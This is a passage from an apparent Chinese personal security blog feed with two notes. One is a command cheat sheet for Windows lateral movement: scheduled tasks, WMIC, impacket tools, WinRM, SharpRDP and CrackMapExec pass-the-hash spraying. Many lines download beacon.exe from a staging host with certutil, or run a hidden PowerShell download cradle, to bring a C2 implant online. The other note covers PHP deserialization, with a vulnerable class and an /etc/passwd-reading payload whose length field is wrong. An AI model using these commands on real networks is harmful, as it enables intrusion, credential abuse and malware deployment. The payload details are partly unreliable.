#拷贝执行文件到目标机器</span><br><span class="line"><span class="built_in">at</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">21</span> <span class="number">15</span>:<span class="number">47</span> c:\beacon.exe #添加计划任务</span><br></pre></td></tr></table></figure><h4 id="2-schtasks-Windows2012"><a href="#2-schtasks-Windows2012" class="headerlink" title="2,schtasks &gt;&#x3D;Windows2012"></a>2,schtasks &gt;&#x3D;Windows2012</h4><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy</span> beacon,exe \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">32</span>\c$ #拷贝执行文件到目标机器</span><br><span class="line">schtasks /create /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">22</span> /ru &quot;SYSTEM&quot; /tn beacon /sc DAILT /tr c:\beacon.exe /F # 创建beacon任务对应执行文件</span><br><span class="line">schtasks /run /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">32</span> /tn beacon /i #运行beacon任务</span><br><span class="line">schtasks /delete /s <span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">32</span> /tn beacon /f #删除beacon任务</span><br></pre></td></tr></table></figure><h4 id="impacket"><a href="#impacket" class="headerlink" title="impacket"></a>impacket</h4><p><a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a><br>atexec.py连接（Socks代理下）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python atexec.py ./administrator:密码@IP &quot;ver&quot;</span><br><span class="line">python atexec.py -hashes : 密码hash ./administrator@IP &quot;whoami&quot;</span><br></pre></td></tr></table></figure><h2 id="WMIC"><a href="#WMIC" class="headerlink" title="WMIC"></a>WMIC</h2><p>从win2003开启一直存在，它原本的作用是方便管理员对windows主机进行管理。因此在内网渗透中，我们可以使用WMI进行横向移动，支持用户明文或者hash的方式进行认证，并且该方式不会在目标日志系统留下痕迹<br>利用条件：<br>1，WMI服务开启，端口135，默认开启<br>2，防火请运行135，445等端口通信<br>3，知道目标机的账户密码或HASH<br><strong>利用：</strong></p><h3 id="1-wmic"><a href="#1-wmic" class="headerlink" title="1.wmic"></a>1.wmic</h3><p>使用目标系统的cmd.exe执行一条命令，将执行结果保存在C盘的ip.txt文件中，</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WMIC /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">159</span>.<span class="number">130</span> /user:test\administrator /password:admin123! Process <span class="keyword">Call</span> Create &quot;<span class="built_in">cmd</span>.exe /c <span class="built_in">ipconfig</span> &gt;c:\ip.txt&quot;</span><br></pre></td></tr></table></figure><p>建立ipc$后，使用type命令读取执行结果，具体如下</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">3</span>\ipc$ &quot;Admin!@#$<span class="number">4321</span>&quot; /user:administrator</span><br><span class="line"><span class="built_in">type</span> \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">3</span>\C$\ip.txt</span><br></pre></td></tr></table></figure><p>或者上传后门文件                                                </p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WMIC /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">159</span>.<span class="number">130</span> /user:test\administrator /password:admin123! Process <span class="keyword">Call</span> Create &quot;certutil -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">32</span>/beacon.exe c:/beacon.exe&quot;</span><br><span class="line">WMIC /node:<span class="number">192</span>.<span class="number">168</span>.<span class="number">159</span>.<span class="number">130</span> /user:test\administrator /password:admin123! Process <span class="keyword">Call</span> Create &quot;c:/beacon.exe&quot;</span><br></pre></td></tr></table></figure><p><strong>impacket工具包中的wmiexec</strong><br>Impacket-windows工具包下载地址：<a href="https://github.com/maaaaz/impacket-examples-windows">https://github.com/maaaaz/impacket-examples-windows</a></p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe hacke/administrator:Admin!@#$4321@192<span class="number">.168</span><span class="number">.1</span><span class="number">.2</span></span><br></pre></td></tr></table></figure><p>或者wmiexec.py文件</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> wmicexec.py test/administrator:admin!@#123@192<span class="number">.168</span><span class="number">.2</span><span class="number">.32</span></span><br><span class="line"><span class="keyword">python</span> wmicexec.py test/administrator:admin!@#123@192<span class="number">.168</span><span class="number">.2</span><span class="number">.32</span> <span class="string">&quot;whoami&quot;</span></span><br><span class="line"><span class="keyword">python</span> wmicexec.py -hashes :<span class="number">517</span>b96ad4178a5369dc997aa02d455c test/administrator@192<span class="number">.168</span><span class="number">.2</span><span class="number">.32</span> <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure><p>下载后门</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python wmiexec.py test/admininstrator:admin!@<span class="number">123</span>@<span class="number">192</span>.<span class="number">168</span>.<span class="number">2</span>.<span class="number">32</span> &quot;certutil -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">32</span>/beacon.exe c:/beacon.exe&quot;</span><br></pre></td></tr></table></figure><p>执行后门</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">python</span> wmiexec.py test/admininstrator:admin!@123@192<span class="number">.168</span><span class="number">.2</span><span class="number">.32</span> <span class="string">&quot;c:/beacon.exe&quot;</span></span><br></pre></td></tr></table></figure><h3 id="2-cscript（没啥用）"><a href="#2-cscript（没啥用）" class="headerlink" title="2.cscript（没啥用）"></a>2.cscript（没啥用）</h3><p>Wmiexec.vbs脚本通过VBS调用WMI来模拟PsExec功能。wmiexec.vbs可以在远程系统中执行命令并进行回显，获得远程主机的半交互式shell</p><p>下载地址：<a href="https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a> 这里有个坑，不能直接用wget下载，需要直接把代码复制下来编辑成.vbs文件</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、半交互模式</span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell ip username password</span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> administrator Admin!@#$<span class="number">4321</span></span><br><span class="line"><span class="number">2</span>、单命令执行</span><br><span class="line">cscript.exe wmiexec.vbs /<span class="built_in">cmd</span> ip username password &quot;command&quot;</span><br><span class="line">cscript.exe wmiexec.vbs /<span class="built_in">cmd</span> <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> administrator Admin!@#$<span class="number">4321</span> &quot;<span class="built_in">ipconfig</span>&quot;</span><br><span class="line"><span class="number">3</span>、wce_hash注入</span><br><span class="line">如果抓取的LM hash是AAD3开头的，或者是No Password之类的，就用<span class="number">32</span>个<span class="number">0</span>代替LM hash</span><br><span class="line">wce -s hash</span><br><span class="line">cscript.exe //nologo wmiexec.vbs /shell ip</span><br></pre></td></tr></table></figure><p>获得一个半交互模式shell</p><h3 id="3-Invoke-WmiCommand"><a href="#3-Invoke-WmiCommand" class="headerlink" title="3.Invoke-WmiCommand"></a>3.Invoke-WmiCommand</h3><p>Invoke-WmiCommand.ps1脚本包含在PowerSploit工具包很难过。该脚本主要通过powershell调用WMI来远程执行命令，本质还是在利用WMIs</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//目标系统用户名</span><br><span class="line"><span class="variable">$User</span> = <span class="string">&quot;hacke\administrator&quot;</span></span><br><span class="line">//目标系统密码</span><br><span class="line"><span class="variable">$Password</span>= <span class="built_in">ConvertTo-SecureString</span> <span class="literal">-String</span> <span class="string">&quot;Admin!@#<span class="variable">$4321</span>&quot;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span></span><br><span class="line">//将账号和密码整合起来，以便导入Credential</span><br><span class="line"><span class="variable">$Cred</span> = <span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Management.Automation.PSCreadential <span class="literal">-ArgumentList</span> <span class="variable">$User</span> , <span class="variable">$Password</span></span><br><span class="line">//远程执行命令</span><br><span class="line"><span class="variable">$Rmote</span>=<span class="built_in">Invoke-WmiCommand</span> <span class="literal">-payload</span> &#123;ipconfig&#125; <span class="literal">-Credential</span> <span class="variable">$Cred</span> <span class="literal">-ComputerName</span> <span class="number">192.168</span>.<span class="number">1.1</span></span><br><span class="line">//将执行结果输出到屏幕上</span><br><span class="line"><span class="variable">$Remote</span>.PayloadOutput</span><br></pre></td></tr></table></figure><h3 id="4-Invoke-WMIMethod"><a href="#4-Invoke-WMIMethod" class="headerlink" title="4.Invoke-WMIMethod"></a>4.Invoke-WMIMethod</h3><p>Powershell自带的Invoke-WMIMethod可以在远程系统中执行命令和指定程序</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//目标系统用户名</span><br><span class="line">$User = &quot;hacke\administrator&quot;</span><br><span class="line">//目标系统密码</span><br><span class="line">$Password= ConvertTo-SecureString -String &quot;Admin!@#$<span class="number">4321</span>&quot; -AsPlainText -Force</span><br><span class="line">//将账号和密码整合起来，以便导入Credential</span><br><span class="line">$Cred = New-Object -TypeName System.Management.Automation.PSCreadential -ArgumentList $User , $Password</span><br><span class="line">//远程执行命令</span><br><span class="line">Invoke-WMIMethod -Class Win32_Process -Name Create -ArgumentList &quot;calc.exe&quot; -ComputerName &quot;<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span>&quot; -Creadential $Cred</span><br></pre></td></tr></table></figure><h3 id="5-crackmapexec"><a href="#5-crackmapexec" class="headerlink" title="5.crackmapexec"></a>5.crackmapexec</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">1</span> -u administrator -p Admin!@#$<span class="number">4321</span> -x &quot;<span class="built_in">net</span> user test test /add&quot;</span><br></pre></td></tr></table></figure><h3 id="6-smbexec"><a href="#6-smbexec" class="headerlink" title="6.smbexec"></a>6.smbexec</h3><p>smbexec可以通过文件共享（admin$、C$、ipc$、d$）在远程系统中执行命令，使用的时候，目标系的共享必须试开放的错c 、ipc、admin<br>C++版smbexec的下载地址<a href="https://github.com/sunorr/smbexec">https://github.com/sunorr/smbexec</a><br>1、工具使用</p><ul><li>test.exe：客户端程序</li><li>exec server.exe：目标系统中的辅助程序<br>2、使用方法<br>将execserver.exe上传到目标系统的C:\windwos\目录下，接触UAC对命令执行的限制。在命令行环境中执行如下命令</li></ul><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">net</span> use \\<span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">3</span> &quot;Admin!@#$<span class="number">4321</span>&quot; /user:HACKE\administrator</span><br></pre></td></tr></table></figure><p>之后在客户端的命令行环境中执行如下命令s</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test.exe <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.<span class="number">3</span> administrator Admin!@#$<span class="number">4321</span> whoami c$</span><br></pre></td></tr></table></figure><p>VS2019编译的时候有问题，没编译成exes<br><strong>impact 工具包中的smbexec.exe</strong><br>这里依旧使用windows下编译好的smbexec.exe这里要注意的有两点，一个是\是为了转义而添加的，二是在密码处可以用双引号阔起来。这里因为在Windows下测试的，没有出现这个情况</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec.exe HACKE/administrator:Admin!@#$4321@192.168.1.1</span><br></pre></td></tr></table></figure><h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><p>DCOM（分布式组件对象模型）是微软的一系列概念和程序接口。通过DOCM,客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求。<br>DCOM是基于组件对象模型（COM）的。COM提供了一套允许在同一台计算机上的客户端和服务器之间进行通信的接口（运行在Windows95及之后版本的操作系统中）<br>条件：<br>1，使用目标Win7系统以上<br>2，管理员权限PowerShell<br>3，远程主机防火强未阻止<br><strong>dcomexec-impacket</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python dcomexec.py test/administrator:admin!@#123@192.168.3.32</span><br><span class="line">python dcomexec.py test/administrator:admin!@#123@192.168.3.32 whoami</span><br><span class="line">python dcomexec.py test/administrator:admin!@#123@192.168.3.32 whoami -hashes :517b96ad4178a5369dc997aa02d455c</span><br></pre></td></tr></table></figure><h2 id="WinRM-WinRS"><a href="#WinRM-WinRS" class="headerlink" title="WinRM&amp;WinRS"></a>WinRM&amp;WinRS</h2><p>WinRM（Windows Remote Management）, Windows远程管理,WinRM允许远程用户使用工具和脚本对Windows服务器进行管理并获取数据。Server2008 R2中默认开启该服务，Server2012开始，该服务便集成在系统中默认开启，家庭版的电脑是默认关闭的这种远程连接不会被客户端察觉到，也不会占用远程连接数！</p><p>WinRM端口：<br>HTTP是5985端口进行通信<br>HTTPS 是5986端口来进行通信</p><p>对方防火墙关闭，或者允许WinRM端口进行通信</p><p>开启WinRM服务<br>有俩种方式：</p><ul><li>powershell 运行 enable-psremoting</li><li>cmd运行winrm quickconfig</li></ul><p>通过winrs来执行远程命令</p><h3 id="winrs："><a href="#winrs：" class="headerlink" title="winrs："></a>winrs：</h3><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">5985</span> -u:机器名\用户名 -p:xxxxx &quot;<span class="built_in">ipconfig</span>&quot; </span><br><span class="line">winrs -r:https://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">5985</span> -u:机器名\用户名 -p:xxxxx &quot;<span class="built_in">ipconfig</span>&quot; </span><br><span class="line">winrs -r:http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">5985</span> -u:机器名\用户名 -p:xxxxx <span class="built_in">cmd</span></span><br><span class="line">winrs -r:https://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">5985</span> -u:机器名\用户名 -p:xxxxx c</span><br></pre></td></tr></table></figure><h3 id="winrm-cmd"><a href="#winrm-cmd" class="headerlink" title="winrm.cmd"></a>winrm.cmd</h3><p>上线C2：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://<span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span>:<span class="number">5985</span> -u:机器名\用户名 -p:xxxxx &quot;<span class="built_in">cmd</span>.exe /c certutil -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">32</span>/beacon.exe beacon.exe &amp; beacon.exe&quot; </span><br></pre></td></tr></table></figure><h3 id="winrm-cmd-1"><a href="#winrm-cmd-1" class="headerlink" title="winrm.cmd"></a>winrm.cmd</h3><p>CS上：</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell winrm invoke Create wmicimv2/win32_process @&#123;CommandLine=&quot;<span class="built_in">cmd</span>.exe /c certutil -urlcache -split -f http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">3</span>.<span class="number">32</span>/beacon.exe beacon.exe &amp; beacon.exe&quot;&#125; -r:机器名 -u:机器名\用户名 -p:密码</span><br></pre></td></tr></table></figure><h3 id="powershell："><a href="#powershell：" class="headerlink" title="powershell："></a>powershell：</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> TARGET <span class="literal">-ScriptBlock</span> &#123; <span class="built_in">dir</span> c:\ &#125;</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> TARGET <span class="literal">-Credential</span> 域名\用户名 <span class="literal">-command</span> &#123;<span class="built_in">Get-Culture</span>&#125;</span><br><span class="line"><span class="built_in">Invoke-Command</span> <span class="literal">-ComputerName</span> TARGET <span class="literal">-Credential</span> 域名\用户名 <span class="literal">-ScriptBlock</span> &#123;<span class="built_in">Get-Culture</span>&#125;</span><br></pre></td></tr></table></figure><p>如果报错，运行此命令<br><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-17%20012244.png"><br>只需要输入下面指令注册一下即可</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrm <span class="built_in">set</span> winrm/config/Client @&#123;TrustedHosts=&quot;*&quot;&#125;</span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/ppp/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202025-06-17%20012431.png"></p><h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><p>远程左面服务，支持明文及HASH连接<br>条件：目标主机开启RDP服务，远程桌面，获取了明文或HASH密文<br>端口：3389<br>mstsc.exe</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tasklist /svc | <span class="built_in">find</span> &quot;TermService&quot; #找到对应服务进程的PID</span><br><span class="line">netstat -ano | <span class="built_in">find</span> &quot;PID值&quot;  #找到进程对应的端口号</span><br></pre></td></tr></table></figure><p>端口转发映射（不可取）<br>使用HTTP隧道，将对方3389端口绑定到本地2222端口<br><img src="/img/image.png" alt="alt text"><br>连接本地的127.0.0.1:2222端口<br><img src="/img/image-1.png" alt="alt text"><br>将获取的账户密码进行登录<br><img src="/img/image-2.png" alt="alt text"></p><p>SharpRDP（比较鸡肋）<br>在不通过 GUI 客户端和 Socks 代理的情况下，基于 RDP 协议进行横向移动。<br><a href="https://github.com/0xthirteen/SharpRDP">https://github.com/0xthirteen/SharpRDP</a> ，下载后直接用 Visual Studio 编译运行即可。<br>C2上线</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SharpRDP.exe <span class="attribute">computername</span>=ip <span class="attribute">command</span>=<span class="string">&quot;powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net,webclient).downloadstring(&#x27;http://ip:83/a&#x27;))\&quot;&quot;</span></span><br><span class="line"><span class="attribute">username</span>=用户名 <span class="attribute">password</span>=密码</span><br></pre></td></tr></table></figure><h2 id="CrackMapExec-密码喷射"><a href="#CrackMapExec-密码喷射" class="headerlink" title="CrackMapExec-密码喷射"></a>CrackMapExec-密码喷射</h2><p><a href="https://github.com/byt3bl33d3r/CrackMapExec">https://github.com/byt3bl33d3r/CrackMapExec</a><br>下载对应release，建立socks连接，设置socks代理，配置规则，调用!<br>1,Linux Proxychains使用<br>代理配置：Proxychains.conf<br>代理调用：Proxychains命令<br>2,密码喷射-域用户登录PTH：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">参数：-u 用户 ，-<span class="selector-tag">p</span> 密码，-H 哈希值，-d 指定域，-<span class="attribute">x</span> 执行命令</span><br></pre></td></tr></table></figure><p>主要功能：多协议探针，字典设置，本地及域喷射，命令回显执行等</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 crackmapexec smb 192.168.3.21-32 -u user.txt -H 518fa788f8878dc788faa89889c #域用户HASH登录</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">上线C2</span></span><br><span class="line">proxychains4 crackmapexec smb 192.168.3.21-32 -u user.txt -H 518fa788f8878dc788faa89889c --local-auth -x &quot;cmd.exe /c certutil -urlcache -split -f http://192.168.3.32/beacon.exe beacon.exe &amp; beacon.exe&quot;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP-反序列化</title>
      <link href="/2025/06/17/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2025/06/17/PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP-反序列化"><a href="#PHP-反序列化" class="headerlink" title="PHP-反序列化"></a>PHP-反序列化</h1><p>在 PHP 里，序列化是把一个对象或数组转换成字符串的过程（比如保存到文件或传输到网络），而反序列化就是把这个字符串还原成原来的变量（对象 &#x2F; 数组）。</p><p>用 PHP 的两个函数表示就是：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ser</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);     <span class="comment">// 序列化</span></span><br><span class="line"><span class="variable">$unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser</span>); <span class="comment">// 反序列化</span></span><br></pre></td></tr></table></figure><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-15-1024x278.png"></p><p>为什么反序列化会存在漏洞？</p><p>因为 unserialize() 在反序列化对象时，会自动调用一些类里面的特殊方法，比如：</p><p><a href="https://www.bilibili.com/video/BV12om2YTEgW?spm_id_from=333.788.videopod.episodes&vd_source=89bf25153801ebc942aaf90aa2af1675&p=63">https://www.bilibili.com/video/BV12om2YTEgW?spm_id_from=333.788.videopod.episodes&amp;vd_source=89bf25153801ebc942aaf90aa2af1675&amp;p=63</a></p><ul><li>__wakeup：反序列化时自动调用</li><li>__seleep ()：序列化时自动调用</li><li>__constuct：构造对象时调用</li><li>__destruct()：对象被销毁时自动调用</li><li>__toString()：对象被当成字符串使用时调用</li><li>__call()：调用不存在方法时触发</li><li>__invoke()：对象被当函数调用时触发</li><li>__get ()：访问不存在的成员变量时调用</li><li>__set ()：设置对象不存在的属性或无法访问（私有）的属性时调用</li><li>__isset ()：检查对象的某个属性是否存在会执行此函数，当对不可访问的属性调用 isset () 或 empty () 时，会被自动调用</li><li>__unset ()：在不可访问的某个属性上使用 unset 函数执行，销毁对象的某个不存在属性时自动调用__unset ()</li></ul><p>如果这些方法里面有可以被控制的敏感操作（比如文件读写、命令执行等），就可能被利用形成漏洞</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;haohao&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span>=<span class="number">19</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span>= <span class="string">&quot;man&quot;</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">aaa</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="variable">$demo</span>=<span class="keyword">new</span> <span class="title function_ invoke__">student</span>();</span><br><span class="line">    <span class="variable">$wocao</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$demo</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$wocao</span>;</span><br></pre></td></tr></table></figure><p>使用 serialize 函数进行序列化</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-16.png"></p><p>unserialize 函数进行反序列化</p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87-17-1024x33.png"></p><h2 id="反序列化漏洞："><a href="#反序列化漏洞：" class="headerlink" title="反序列化漏洞："></a>反序列化漏洞：</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="variable">$payload</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$payload</span>);</span><br></pre></td></tr></table></figure><p>攻击思路：</p><p>在 ctf 中的解题思路</p><p>1，复制源代码到本地<br>2，注释掉和属性无关的内容<br>3，根据题目需要，给属性赋值<br>4，生成序列化数据，通常要用到 urlencode<br>5，传递数据到服务器</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cat</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;/etc/passwd&quot;</span>;      <span class="comment">//只留需要的属性,并赋值</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$exploit</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">Cat</span>());</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$exploit</span>;</span><br></pre></td></tr></table></figure><p>将 payload 上传到程序</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://target.com/vuln.php?data=O:<span class="number">3</span>:<span class="string">&quot;Cat&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;nya&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;/etc/passwd&quot;</span>;&#125;  //可使用urlencode编码后再传参</span><br></pre></td></tr></table></figure><h2 id="wakeup-漏洞："><a href="#wakeup-漏洞：" class="headerlink" title="__wakeup 